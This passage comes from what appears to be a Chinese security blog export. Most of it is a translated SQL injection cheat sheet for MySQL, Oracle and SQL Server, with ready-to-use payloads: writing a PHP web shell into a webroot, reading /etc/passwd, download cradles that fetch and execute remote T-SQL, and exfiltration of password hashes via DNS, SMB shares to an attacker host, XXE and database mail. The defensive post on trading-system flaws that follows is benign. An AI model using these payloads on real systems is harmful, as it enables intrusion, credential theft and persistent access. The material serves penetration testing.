rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql</a></td></tr></tbody></table><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p>　　读取和写入文件有助于数据收集和数据泄露。许多方法包括写入webroot，这可以执行webshell，或允许数据通过端口80/443被泄露。</p><h4 id="MySQL-4"><a href="#MySQL-4" class="headerlink" title="MySQL"></a>MySQL</h4><p>　　<code>*</code>需要特权用户</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>转储到文件</td><td style="text-align:center">SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’</td></tr><tr><td>写入 PHP Shell 到文件</td><td style="text-align:center">SELECT ‘system($_GET[\’c\’]); ?&gt;’ INTO OUTFILE ‘/var/www/shell.php’</td></tr><tr><td>读文件</td><td style="text-align:center">SELECT LOAD_FILE(‘/etc/passwd’)</td></tr><tr><td>读取混淆的文件</td><td style="text-align:center">SELECT LOAD_FILE(0x633A5C626F6F742E696E69)<br>reads c:\boot.ini</td></tr><tr><td>文件权限</td><td style="text-align:center">SELECT file_priv FROM mysql.user WHERE user = ‘netspi’<br>SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘file’ AND grantee like ‘%netspi%’</td></tr></tbody></table><h4 id="Oracle-5"><a href="#Oracle-5" class="headerlink" title="Oracle"></a>Oracle</h4><p>　　有时可以使用<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" target="_blank" rel="noopener">UTL_FILE</a>。检查以下是否为非null</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">value</span> <span class="keyword">FROM</span> v$parameter2 <span class="keyword">WHERE</span> <span class="keyword">name</span> = <span class="string">'utl_file_dir'</span>;</span><br></pre></td></tr></table></figure><p>　　如果安装了<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" target="_blank" rel="noopener">Java</a>（Oracle Express中不可用），可用于读取和写入文件。</p><h4 id="SQL-Server-5"><a href="#SQL-Server-5" class="headerlink" title="SQL Server"></a>SQL Server</h4><p>　　<code>*</code>需要特权用户</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>在服务器中下载Cradle bulk - TSQL</td><td style="text-align:center">-- Bulk Insert - Download Cradle Example<br>-- Setup variables Declare @cmd varchar(8000)<br>-- Create temp table<br>CREATE TABLE #file (content nvarchar(4000));<br>-- Read file into temp table - web server must support propfind<br><br>BULK INSERT #file FROM ‘\sharepoint.acme.com@SSL\Path\to\file.txt’;<br>-- Select contents of file<br><br>SELECT @cmd = content FROM #file<br>-- Display command<br><br>SELECT @cmd<br>-- Run command<br><br>EXECUTE(@cmd)<br>-- Drop the temp table<br><br>DROP TABLE #file</td></tr><tr><td>下载Cradle OAP 1 - SQL</td><td style="text-align:center"><br>-- OLE Automation Procedure - Download Cradle Example<br>-- Does not require a table, but can’t handle larger payloads<br><br>-- Note: This also works with unc paths \\ip\file.txt<br>-- Note: This also works with webdav paths \ip@80\file.txt However, the target web server needs to support propfind.<br><br>-- Setup Variables<br>DECLARE @url varchar(300)<br>DECLARE @WinHTTP int<br>DECLARE @handle int<br>DECLARE @Command varchar(8000<br><br>-- Set target url containting TSQL<br>SET @url = ‘<a href="http://127.0.0.1/mycmd.txt&#39;" target="_blank" rel="noopener">http://127.0.0.1/mycmd.txt&#39;</a><br><br>-- Setup namespace<br>EXEC @handle=sp_OACreate ‘WinHttp.WinHttpRequest.5.1’,@WinHTTP OUT<br><br>-- Call the Open method to setup the HTTP request<br>EXEC @handle=sp_OAMethod @WinHTTP, ‘Open’,NULL,’GET’,@url,’false’<br><br>-- Call the Send method to send the HTTP GET request<br>EXEC @handle=sp_OAMethod @WinHTTP,’Send’<br><br>-- Capture the HTTP response content<br>EXEC @handle=sp_OAGetProperty @WinHTTP,’ResponseText’, @Command out<br><br>-- Destroy the object<br>EXEC @handle=sp_OADestroy @WinHTTP<br><br>-- Display command<br>SELECT @Command<br><br>-- Run command<br>EXECUTE (@Command)</td></tr><tr><td>下载Cradle OAP 2 - TSQL</td><td style="text-align:center"><br>-- OLE Automation Procedure - Download Cradle Example - Option 2<br>-- Can handle larger payloads, but requires a table<br><br>-- Note: This also works with unc paths \ip\file.txt<br>-- Note: This also works with webdav paths \ip@80\file.txt However, the target web server needs to support propfind.<br><br>-- Setup Variables<br>DECLARE @url varchar(300)<br>DECLARE @WinHTTP int<br>DECLARE @Handle int<br>DECLARE @Command varchar(8000)<br><br>-- Set target url containting TSQL<br>SET @url = ‘<a href="http://127.0.0.1/mycmd.txt&#39;" target="_blank" rel="noopener">http://127.0.0.1/mycmd.txt&#39;</a><br><br>-- Create temp table to store downloaded string<br>CREATE TABLE #text(html text NULL)<br><br>-- Setup namespace<br>EXEC @Handle=sp_OACreate ‘WinHttp.WinHttpRequest.5.1’,@WinHTTP OUT<br><br>-- Call open method to configure HTTP request<br>EXEC @Handle=sp_OAMethod @WinHTTP, ‘Open’,NULL,’GET’,@url,’false’<br><br>-- Call Send method to send the HTTP request<br>EXEC @Handle=sp_OAMethod @WinHTTP,’Send’<br><br>-- Capture the HTTP response content<br>INSERT #text(html)<br>EXEC @Handle=sp_OAGetProperty @WinHTTP,’ResponseText’<br><br>-- Destroy the object<br>EXEC @Handle=sp_OADestroy @WinHTTP<br><br>-- Display the commad<br>SELECT @Command = html from #text<br>SELECT @Command<br><br>-- Run the command<br>EXECUTE (@Command)<br><br>-- Remove temp table<br>DROP TABLE #text</td></tr><tr><td>读取文件 - TSQL</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceTxt.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceTxt.sql</a><br> <a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_BulkInsert.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_BulkInsert.sql</a><br> <a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceXlsx" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceXlsx</a><br><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetBulk.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetBulk.sql</a><br><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetTxt.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetTxt.sql</a><br> <a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetXlsx.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetXlsx.sql</a></td></tr><tr><td>写文件 - TSQL</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql</a><br><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_OpenRowSetTxt.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_OpenRowSetTxt.sql</a></td></tr></tbody></table><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>　　横向移动允许测试人员访问不同的功能/数据集，这些功能/数据不明确要求为特权的用户。横向切换用户帐户将暴露不同的信息，并可能有助于损害更多特权用户。</p><h4 id="MySQL-5"><a href="#MySQL-5" class="headerlink" title="MySQL"></a>MySQL</h4><p>　　<code>*</code>需要特权用户</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>创建用户</td><td style="text-align:center">CREATE USER ‘netspi‘@’%’ IDENTIFIED BY ‘password’</td></tr><tr><td>删除用户</td><td style="text-align:center">DROP USER netspi</td></tr></tbody></table><h4 id="Oracle-6"><a href="#Oracle-6" class="headerlink" title="Oracle"></a>Oracle</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>创建用户</td><td style="text-align:center">CREATE USER user IDENTIFIED by pass;</td></tr><tr><td>删除用户</td><td style="text-align:center">DROP USER user</td></tr></tbody></table><h4 id="SQL-Server-6"><a href="#SQL-Server-6" class="headerlink" title="SQL Server"></a>SQL Server</h4><p>　　<code>*</code>需要特权用户</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>创建用户</td><td style="text-align:center">EXEC sp_addlogin ‘user’, ‘pass’;</td></tr><tr><td>删除用户</td><td style="text-align:center">EXEC sp_droplogin ‘user’;</td></tr><tr><td>链接抓取</td><td style="text-align:center"><a href="https://blog.netspi.com/sql-server-link-crawling-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/sql-server-link-crawling-powerupsql/</a></td></tr><tr><td>作为当前服务连接到远程数据库</td><td style="text-align:center">–Requires sysadmin <br>SELECT * FROM OPENDATASOURCE(‘SQLNCLI’, ‘Server=MSSQLSRV04\SQLSERVER2016;Trusted_Connection=yes;’).master.dbo.sysdatabases</td></tr></tbody></table><h3 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a><span id="dataExfiltration">数据泄露</span></h3><p>　　泄漏的数据以及任何受损数据的脱机副本可以用来做数据分析。数据可以通过文件，各种Layer 4请求和隐藏技术被泄漏。</p><p>　　<code>*</code>需要特权用户</p><h4 id="MySQL-6"><a href="#MySQL-6" class="headerlink" title="MySQL"></a>MySQL</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>DNS 请求</td><td style="text-align:center"><code>SELECT LOAD\_FILE(concat(&#39;\\\\&#39;,(QUERY\_WITH\_ONLY\_ONE\_ROW), &#39;yourhost.com\\&#39;))</code></td></tr><tr><td>SMB 分享</td><td style="text-align:center"><code>SELECT * FROM USERS INTO OUTFILE &#39;\\attacker\SMBshare\output.txt&#39;</code></td></tr><tr><td>HTTP 服务器</td><td style="text-align:center"><code>SELECT * FROM USERS INTO OUTFILE &#39;/var/www/html/output.txt&#39;</code></td></tr><tr><td>数字连接</td><td style="text-align:center"><code>SELECT length(user())</code><br><code>SELECT ASCII(substr(user(),1))</code><br>当数据只能作为数字导出时，转换为ASCII。 有关自动化<a href="http://zombiehelp54.blogspot.ro/2017/02/sql-injection-in-update-query-bug.html?m=1" target="_blank" rel="noopener">点击此处连接</a>.</td></tr></tbody></table><h4 id="Oracle-7"><a href="#Oracle-7" class="headerlink" title="Oracle"></a>Oracle</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>将多行合并为一行</td><td style="text-align:center"><code>SELECT dbms_xmlgen.getxmltype(&#39;select user from dual&#39;) FROM dual</code></td></tr><tr><td>XML外部实体</td><td style="text-align:center"><code>SELECT xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://IP/test&quot;&gt; %remote; %param1;]&gt;&#39;) FROM dual;</code></td></tr><tr><td>URL_HTTP 请求 (Pre-11gR2)</td><td style="text-align:center"><code>SELECT UTL_HTTP.request (&#39;http://IP/test&#39;) FROM dual;</code></td></tr><tr><td>避免特殊字符</td><td style="text-align:center"><code>SELECT UTL_URL.escape(&#39;http://IP/&#39;</code>  &#124;&#124; <code>USER) FROM dual;</code></td></tr></tbody></table><h4 id="SQL-Server-7"><a href="#SQL-Server-7" class="headerlink" title="SQL Server"></a>SQL Server</h4><p>注意：可以从MSSQL发出DNS请求。但是，此请求需要管理员权限和SQL Server 2005。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>制造DNS请求</td><td style="text-align:center"><code>DECLARE @host varchar(800); select @host = name + &#39;-&#39; + master.sys.fn_varbintohexstr(password_hash) + &#39;netspi.com&#39; from sys.sql_logins;exec(&#39;xp_fileexist &quot;\&#39; + @host + &#39;c$boot.ini&quot;&#39;);</code></td></tr><tr><td>UNC路径（DNS请求）</td><td style="text-align:center"><code>xp_dirtree ‘\\data.domain.com\file’</code></td></tr><tr><td>启用<code>sp_send_dbmail</code>并发送查询</td><td style="text-align:center"><code>sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;sp_configure &#39;Database Mail XPs&#39;, 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients=&#39;harold@netspi.com&#39;,@query=&#39;select @@version&#39;;</code></td></tr><tr><td>基本的<code>xp_sendmail</code>查询</td><td style="text-align:center"><code>EXEC master..xp_sendmail &#39;harold@netspi.com&#39;, &#39;This is a test.&#39;</code></td></tr><tr><td>使用<code>xp_sendmail</code>发送完整的电子邮件</td><td style="text-align:center"><code>EXEC xp_sendmail @recipients=&#39;harold@netspi.com&#39;, @message=&#39;This is a test.&#39;, @copy_recipients=&#39;test@netspi.com&#39;, @subject=&#39;TEST&#39;</code></td></tr><tr><td>通过<code>xp_sendmail</code>发送查询结果</td><td style="text-align:center"><code>EXEC xp_sendmail &#39;harold@netspi.com&#39;, @query=&#39;SELECT @@version&#39;;</code></td></tr><tr><td>通过<code>xp_sendmail</code>发送查询结果作为附件</td><td style="text-align:center"><code>CREATE TABLE ##texttab (c1 text) INSERT ##texttab values (&#39;Put messge here.&#39;) DECLARE @cmd varchar(56)SET @cmd = &#39;SELECT c1 from ##texttab&#39;EXEC master.dbo.xp_sendmail &#39;robertk&#39;,@query = @cmd, @no_header=&#39;TRUE&#39;DROP TABLE ##texttab</code></td></tr></tbody></table><h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><p>　　在系统上获得持久性可在网络中创建半永久性的立足点，从而延长利用时间。有了这个额外的时间，可以尝试不同的载体和利用方法。</p><p>　　<code>*</code>需要特权用户</p><h4 id="MySQL-7"><a href="#MySQL-7" class="headerlink" title="MySQL"></a>MySQL</h4><p>　　暂无</p><h4 id="Oracle-8"><a href="#Oracle-8" class="headerlink" title="Oracle"></a>Oracle</h4><p>　　暂无</p><h4 id="SQL-Server-8"><a href="#SQL-Server-8" class="headerlink" title="SQL Server"></a>SQL Server</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>启动存储过程</td><td style="text-align:center"><a href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/" target="_blank" rel="noopener">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</a></td></tr><tr><td>触发器</td><td style="text-align:center"><a href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/" target="_blank" rel="noopener">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</a></td></tr><tr><td>Regwrite</td><td style="text-align:center"><a href="https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/</a></td></tr></tbody></table><h2 id="6-其他"><a href="#6-其他" class="headerlink" title="6.其他"></a>6.其他</h2><h3 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h3><p>Aaron Yaeger</p><p>Antti Rantasaari</p><p>Ben Tindell</p><p>Colin Salisbury</p><p>Eric Gruber (@egru)</p><p>Jake Reynolds (@jreynoldsdev)</p><p>Khai Tran (@k_tr4n)</p><p>Rafael Seferyan</p><p>Scott Sutherland (@_nullbind)</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><h4 id="MySQL-8"><a href="#MySQL-8" class="headerlink" title="MySQL"></a>MySQL</h4><p><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</a></p><p><a href="http://www.sqlinjectionwiki.com/categories/2/mysql-sql-injection-cheat-sheet/" target="_blank" rel="noopener">http://www.sqlinjectionwiki.com/categories/2/mysql-sql-injection-cheat-sheet/</a></p><p><a href="https://www.tutorialspoint.com/mysql/mysql-sql-injection.htm" target="_blank" rel="noopener">https://www.tutorialspoint.com/mysql/mysql-sql-injection.htm</a></p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/bit-functions.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/bit-functions.html</a></p><p><a href="http://garage4hackers.com/showthread.php?t=1990" target="_blank" rel="noopener">http://garage4hackers.com/showthread.php?t=1990</a></p><p><a href="https://www.perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/" target="_blank" rel="noopener">https://www.perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/</a></p><p><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections</a></p><p><a href="https://websec.ca/kb/sql_injection" target="_blank" rel="noopener">https://websec.ca/kb/sql_injection</a></p><p><a href="http://hakipedia.com/index.php/SQL_Injection" target="_blank" rel="noopener">http://hakipedia.com/index.php/SQL_Injection</a></p><p><a href="http://blog.kotowicz.net/2013/01/abusing-mysql-string-arithmetic-for.html" target="_blank" rel="noopener">http://blog.kotowicz.net/2013/01/abusing-mysql-string-arithmetic-for.html</a></p><p><a href="https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-WP.pdf" target="_blank" rel="noopener">https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-WP.pdf</a></p><p><a href="http://www.securiteam.com/securityreviews/5JP0F20EUM.html" target="_blank" rel="noopener">http://www.securiteam.com/securityreviews/5JP0F20EUM.html</a></p><p><a href="https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/" target="_blank" rel="noopener">https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/</a></p><p><a href="http://zombiehelp54.blogspot.ro/2017/02/sql-injection-in-update-query-bug.html?m=1" target="_blank" rel="noopener">http://zombiehelp54.blogspot.ro/2017/02/sql-injection-in-update-query-bug.html?m=1</a></p><p><a href="http://stackoverflow.com/questions/14714750/how-to-get-true-size-of-mysql-database" target="_blank" rel="noopener">http://stackoverflow.com/questions/14714750/how-to-get-true-size-of-mysql-database</a></p><p><a href="http://stackoverflow.com/questions/5648420/get-all-columns-from-all-mysql-tables" target="_blank" rel="noopener">http://stackoverflow.com/questions/5648420/get-all-columns-from-all-mysql-tables</a></p><p><a href="http://www.regular-expressions.info/creditcard.html" target="_blank" rel="noopener">http://www.regular-expressions.info/creditcard.html</a></p><h4 id="Oracle-9"><a href="#Oracle-9" class="headerlink" title="Oracle"></a>Oracle</h4><p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" target="_blank" rel="noopener">http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql</a></p><p><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</a></p><p><a href="http://www.sqlinjectionwiki.com/Categories/3/oracle-sql-injection-cheat-sheet" target="_blank" rel="noopener">http://www.sqlinjectionwiki.com/Categories/3/oracle-sql-injection-cheat-sheet</a></p><p><a href="https://information.rapid7.com/rs/rapid7/images/R7%20SQL_Injection_Cheat_Sheet.v1.pdf" target="_blank" rel="noopener">https://information.rapid7.com/rs/rapid7/images/R7%20SQL_Injection_Cheat_Sheet.v1.pdf</a></p><p><a href="http://www.sqlinjection.net/union/" target="_blank" rel="noopener">http://www.sqlinjection.net/union/</a></p><h4 id="SQL-Server-9"><a href="#SQL-Server-9" class="headerlink" title="SQL Server"></a>SQL Server</h4><p><a href="https://information.rapid7.com/rs/rapid7/images/R7%20SQL_Injection_Cheat_Sheet.v1.pdf" target="_blank" rel="noopener">https://information.rapid7.com/rs/rapid7/images/R7%20SQL_Injection_Cheat_Sheet.v1.pdf</a></p><p><a href="https://www.gracefulsecurity.com/sql-injection-exploitation/" target="_blank" rel="noopener">https://www.gracefulsecurity.com/sql-injection-exploitation/</a></p><p><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a></p><p><a href="http://websec.ca/kb/sql_injection#MSSQL_Default_Databases" target="_blank" rel="noopener">http://websec.ca/kb/sql_injection#MSSQL_Default_Databases</a></p><p><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p><p><a href="http://pentestmonkey.net/blog/mssql-dns" target="_blank" rel="noopener">http://pentestmonkey.net/blog/mssql-dns</a></p><p><a href="http://www.sqlinjectionwiki.com/Categories/1/mssql-sql-injection-cheat-sheet/" target="_blank" rel="noopener">http://www.sqlinjectionwiki.com/Categories/1/mssql-sql-injection-cheat-sheet/</a></p><p><a href="https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/templates-tsql/Get-QueryHistory.sql" target="_blank" rel="noopener">https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/templates-tsql/Get-QueryHistory.sql</a></p><p><a href="https://www.codeproject.com/Questions/219741/Select-nth-row-of-a-table-in-sql-server" target="_blank" rel="noopener">https://www.codeproject.com/Questions/219741/Select-nth-row-of-a-table-in-sql-server</a></p><p><a href="http://www.sqlinjection.net/time-based/" target="_blank" rel="noopener">http://www.sqlinjection.net/time-based/</a></p><p><a href="https://stackoverflow.com/questions/639854/check-if-a-row-exists-otherwise-insert" target="_blank" rel="noopener">https://stackoverflow.com/questions/639854/check-if-a-row-exists-otherwise-insert</a></p><h3 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h3><p>　　可以在下面找到一些有用的用于测试查询的在线沙箱</p><h4 id="MySQL-9"><a href="#MySQL-9" class="headerlink" title="MySQL"></a>MySQL</h4><p><a href="http://sqlfiddle.com/#!9" target="_blank" rel="noopener">http://sqlfiddle.com/#!9</a></p><p><a href="http://rextester.com/l/mysql_online_compiler" target="_blank" rel="noopener">http://rextester.com/l/mysql_online_compiler</a></p><p><a href="https://www.tutorialspoint.com/mysql_terminal_online.php" target="_blank" rel="noopener">https://www.tutorialspoint.com/mysql_terminal_online.php</a></p><p><a href="https://www.jdoodle.com/online-mysql-terminal" target="_blank" rel="noopener">https://www.jdoodle.com/online-mysql-terminal</a></p><h4 id="Oracle-10"><a href="#Oracle-10" class="headerlink" title="Oracle"></a>Oracle</h4><p><a href="http://sqlfiddle.com/#!4" target="_blank" rel="noopener">http://sqlfiddle.com/#!4</a></p><p><a href="https://livesql.oracle.com/apex/livesql/file/index.html" target="_blank" rel="noopener">https://livesql.oracle.com/apex/livesql/file/index.html</a></p><p><a href="https://www.tutorialspoint.com/oracle_terminal_online.php" target="_blank" rel="noopener">https://www.tutorialspoint.com/oracle_terminal_online.php</a></p><h4 id="SQL-Server-10"><a href="#SQL-Server-10" class="headerlink" title="SQL Server"></a>SQL Server</h4><p><a href="http://sqlfiddle.com/#!6" target="_blank" rel="noopener">http://sqlfiddle.com/#!6</a></p><p><a href="https://turbo.net/sql" target="_blank" rel="noopener">https://turbo.net/sql</a></p><p><a href="https://sqlzoo.net/" target="_blank" rel="noopener">https://sqlzoo.net/</a></p><p><a href="http://www.headfirstlabs.com/sql_hands_on/" target="_blank" rel="noopener">http://www.headfirstlabs.com/sql_hands_on/</a></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>　　可以在下面找到一些有用的用于识别和自动执行SQL注入的工具：</p><h4 id="MySQL-10"><a href="#MySQL-10" class="headerlink" title="MySQL"></a>MySQL</h4><p><a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org/</a></p><p><a href="http://sqlninja.sourceforge.net/" target="_blank" rel="noopener">http://sqlninja.sourceforge.net/</a></p><p><a href="https://metasploit.com/" target="_blank" rel="noopener">https://metasploit.com/</a></p><h4 id="Oracle-11"><a href="#Oracle-11" class="headerlink" title="Oracle"></a>Oracle</h4><p><a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org/</a></p><p><a href="http://sqlninja.sourceforge.net/" target="_blank" rel="noopener">http://sqlninja.sourceforge.net/</a></p><p><a href="https://metasploit.com/" target="_blank" rel="noopener">https://metasploit.com/</a></p><h4 id="SQL-Server-11"><a href="#SQL-Server-11" class="headerlink" title="SQL Server"></a>SQL Server</h4><p><a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org/</a></p><p><a href="http://sqlninja.sourceforge.net/" target="_blank" rel="noopener">http://sqlninja.sourceforge.net/</a></p><p><a href="https://metasploit.com/" target="_blank" rel="noopener">https://metasploit.com/</a></p>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> wiki </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>交易系统常见问题及方案概述</title>
      <link href="/Security/%E4%BA%A4%E6%98%93%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E5%8F%8A%E6%96%B9%E6%A1%88%E6%A6%82%E8%BF%B0/"/>
      <url>/Security/%E4%BA%A4%E6%98%93%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E5%8F%8A%E6%96%B9%E6%A1%88%E6%A6%82%E8%BF%B0/</url>
      <content type="html"><![CDATA[<h2 id="一、安全概述"><a href="#一、安全概述" class="headerlink" title="一、安全概述"></a>一、安全概述</h2><p>　　信息安全可以建立、采取有效的技术和管理手段，保护计算机信息系统和网络内的计算机硬件、软件、数据及应用等不因偶然或恶意的原因而遭到破坏、更改和泄漏，保障信息系统能够连续、正常运行。但信息安全是永远是相对的，并且需要不断持续关注和改进，永远没有一劳永逸的安全防护措施。<br><a id="more"></a></p><h2 id="二、常见问题"><a href="#二、常见问题" class="headerlink" title="二、常见问题"></a>二、常见问题</h2><h3 id="1-用户注册"><a href="#1-用户注册" class="headerlink" title="1.用户注册"></a>1.用户注册</h3><h4 id="a-明文传输"><a href="#a-明文传输" class="headerlink" title="a.明文传输"></a>a.明文传输</h4><p>　　在传输用户注册信息时未对信息进行加密处理，攻击者能够使用中间人攻击截获未加密的用户注册信息。</p><p>建议：对用户注册信息加密后传输。</p><h4 id="b-暴力破解"><a href="#b-暴力破解" class="headerlink" title="b.暴力破解"></a>b.暴力破解</h4><p>　　在输入手机验证码等动态验证码时未进行人机校验，攻击者可利用工具对验证码进行暴力破解。</p><p>建议：增加图形验证码。</p><h4 id="c-验证码回传"><a href="#c-验证码回传" class="headerlink" title="c.验证码回传"></a>c.验证码回传</h4><p>　　用户获取动态验证码时后端会将验证码通过response数据包返回到前端，攻击者能够通过抓包获取验证码从而实现任意手机号注册。</p><p>建议：过滤response包中验证码字段。</p><h4 id="d-前端验证"><a href="#d-前端验证" class="headerlink" title="d.前端验证"></a>d.前端验证</h4><p>　　在后端验证完相关信息后会像前端返回状态码，前端根据状态码控制跳转，攻击者通过修改返回的状态码实现绕过验证。</p><p>建议：通过后端控制页面跳转。</p><h4 id="e-验证码失效机制"><a href="#e-验证码失效机制" class="headerlink" title="e.验证码失效机制"></a>e.验证码失效机制</h4><p>验证码失效分两种情况：</p><p>　　1.验证码可以重复使用，攻击者可以通过手动输入一次验证码进行爆破。</p><p>建议：验证码使用后自动刷新。</p><p>　　2.用户A获取的验证码可以用于用户B注册，攻击者可以实现任意用户注册。</p><p>建议：验证码关联用户。</p><h4 id="f-Sql注入"><a href="#f-Sql注入" class="headerlink" title="f.Sql注入"></a>f.Sql注入</h4><p>　　由于查询用户是否存在时未对用户输入进行过滤或过滤不完全，攻击者可通过构造sql语句获取数据库信息。</p><p>建议：过滤用户输入；采用参数化查询；过滤数据库返回错误信息。</p><h4 id="g-XSS"><a href="#g-XSS" class="headerlink" title="g.XSS"></a>g.XSS</h4><p>　　由于在用户注册时未对用户输入进行过滤或者过滤不完全，攻击者可以通过构造语句实现XSS。</p><p>建议：过滤用户输入；转义后输出。</p><h4 id="h-账号遍历"><a href="#h-账号遍历" class="headerlink" title="h.账号遍历"></a>h.账号遍历</h4><p>　　在注册用户时提示用户已存在，攻击者可以通过批量发送数据包来获取已注册的用户账号。</p><p>建议：限制单ip一定时间内提交数据次数；用户存在与否统一不作提示。</p><h4 id="i-业务流绕过"><a href="#i-业务流绕过" class="headerlink" title="i.业务流绕过"></a>i.业务流绕过</h4><p>　　在某些情况下注册流程分为几个页面，攻击者可以通过直接访问后续流程页面实现绕过验证注册。</p><p>建议：严格控制业务流顺序。</p><h4 id="j-短信、邮件炸弹"><a href="#j-短信、邮件炸弹" class="headerlink" title="j.短信、邮件炸弹"></a>j.短信、邮件炸弹</h4><p>　　调用短信、邮件接口时未进行限制，攻击者可以通过批量发送请求数据包实现短信、邮件轰炸或使短信邮件接口堵塞，影响业务正常运行。</p><p>建议：在调用短信、邮件接口时校验验证码；限制单ip一定时间内请求次数。</p><h3 id="2-用户登陆"><a 